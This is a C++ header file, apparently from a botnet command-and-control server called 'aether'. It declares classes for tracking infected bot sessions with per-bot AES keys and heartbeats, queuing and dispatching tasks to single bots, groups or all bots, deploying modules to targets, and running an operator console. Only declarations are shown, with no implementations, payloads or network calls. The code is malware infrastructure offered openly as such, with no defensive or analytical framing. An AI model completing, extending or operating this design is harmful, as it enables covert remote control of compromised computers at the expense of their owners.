#ifndef C2_SERVER_HPP
#define C2_SERVER_HPP

#include "protocol.hpp"
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <memory>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <sqlite3.h>

struct BotSession {
    int socket;
    std::string bot_id;
    std::string os_info;
    unsigned char aes_key[aether::AES_KEY_BITS / 8];
    std::chrono::steady_clock::time_point last_heartbeat;
    std::thread session_thread;
    std::atomic<bool> active{true};
    
    BotSession(int sock, const std::string& id) : socket(sock), bot_id(id) {
        last_heartbeat = std::chrono::steady_clock::now();
    }
};

struct TaskQueue {
    std::string target_bot_id;
    uint8_t task_type;
    std::vector<char> task_data;
    std::chrono::steady_clock::time_point created;
};

class C2Core {
public:
    C2Core();
    ~C2Core();
    
    void run();
    void stop();
    
    // Bot management
    void send_task_to_bot(const std::string& bot_id, uint8_t task_type, const std::vector<char>& data);
    void send_task_to_group(const std::string& group_name, uint8_t task_type, const std::vector<char>& data);
    void send_task_to_all(uint8_t task_type, const std::vector<char>& data);
    
    // Group management
    void create_group(const std::string& group_name);
    void add_bot_to_group(const std::string& group_name, const std::string& bot_id);
    void remove_bot_from_group(const std::string& group_name, const std::string& bot_id);
    
    // Module management
    void load_module_from_file(const std::string& module_name, const std::string& filepath);
    void deploy_module(const std::string& module_name, const std::string& target);
    
    // Information retrieval
    std::vector<std::string> get_active_bots();
    std::vector<std::string> get_groups();
    std::vector<std::string> get_group_members(const std::string& group_name);

private:
    // Core network operations
    void listener_thread();
    void handle_connection(int client_socket);
    void handle_bot_session(std::shared_ptr<BotSession> session);
    
    // Message handling
    void handle_register(std::shared_ptr<BotSession> session, const std::vector<char>& data);
    void handle_heartbeat(std::shared_ptr<BotSession> session, const std::vector<char>& data);
    void handle_task_output(std::shared_ptr<BotSession> session, const std::vector<char>& data);
    
    // Crypto operations
    bool initialize_rsa();
    std::string get_public_key_pem();
    std::string get_cert_pem();
    
    // Database operations
    void init_database();
    void queue_db_query(const std::string& query);
    void db_writer_thread();
    
    // Task management
    void task_dispatcher_thread();
    void queue_task(const std::string& bot_id, uint8_t task_type, const std::vector<char>& data);
    
    // Session management
    void cleanup_inactive_sessions();
    void heartbeat_monitor_thread();
    
    // Member variables
    int server_fd_;
    std::atomic<bool> running_;
    
    // Crypto
    RSA* rsa_keypair_;
    X509* certificate_;
    
    // Session management
    std::map<std::string, std::shared_ptr<BotSession>> active_sessions_;
    std::mutex sessions_mutex_;
    
    // Task queue
    std::queue<TaskQueue> pending_tasks_;
    std::mutex task_queue_mutex_;
    std::condition_variable task_queue_cv_;
    
    // Database
    sqlite3* db_;
    std::queue<std::string> db_queue_;
    std::mutex db_queue_mutex_;
    std::condition_variable db_cond_;
    
    // Worker threads
    std::thread listener_thread_;
    std::thread db_thread_;
    std::thread task_dispatcher_thread_;
    std::thread heartbeat_monitor_thread_;
};

class OperatorConsole {
public:
    OperatorConsole(C2Core& core);
    void run();
    
private:
    void print_help();
    void list_bots();
    void list_groups();
    void create_group(const std::string& name);
    void manage_group(const std::string& action, const std::string& group_name, const std::string& bot_id);
    void send_command(const std::string& target, const std::string& command);
    void deploy_module(const std::string& module_name, const std::string& target);
    void load_module(const std::string& module_name, const std::string& filepath);
    
    C2Core& core_;
};

#endif // C2_SERVER_HPP
